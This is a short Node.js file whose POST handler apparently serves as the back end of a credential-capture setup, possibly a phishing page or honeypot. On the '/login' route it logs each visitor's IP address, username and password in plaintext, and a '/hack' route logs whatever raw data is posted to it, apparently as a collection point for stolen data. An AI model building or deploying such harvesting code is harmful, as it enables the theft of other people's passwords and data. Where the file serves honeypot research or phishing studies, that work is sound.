/*
 * Name: NotPike
 * File: request_type.js
 * Licence: MIT
 * Function: Handles POST, PUT, etc...
 */

const url = require('url');
var qs = require('querystring');


class RequestType {

    postRX(req, logger) {

        // POST Request Logic
        let pData = [];
        req.on('data', chunk => {
            pData.push(chunk)
        });

        req.on('error', (error) => {
            console.log(error);
        });

        // After being gathered check to see who made the request
        req.on('end', () => {
            let response_body = Buffer.concat(pData);

            switch(req.url) { // Where did this POST come from?
                case '/login':
                    const queryObject = url.parse(req.url, true).query;

                    // If GET request has content record IP address and info
                    if (queryObject != null) {
                        var ip = req.headers['x-forwarded-for'] ||
                            req.connection.remoteAddress ||
                            req.socket.remoteAddress ||
                            (req.connection.socket ? req.connection.socket.remoteAddress : null);

                        var post = qs.parse(response_body.toString());
                        logger.log(ip + ' - User: ' + post['user'] + ' Password: ' + post['password']);
                    }    
                    break;

                case '/hack':
                    logger.log(pData);
                    break;
            }
        });

    }

}

module.exports = RequestType;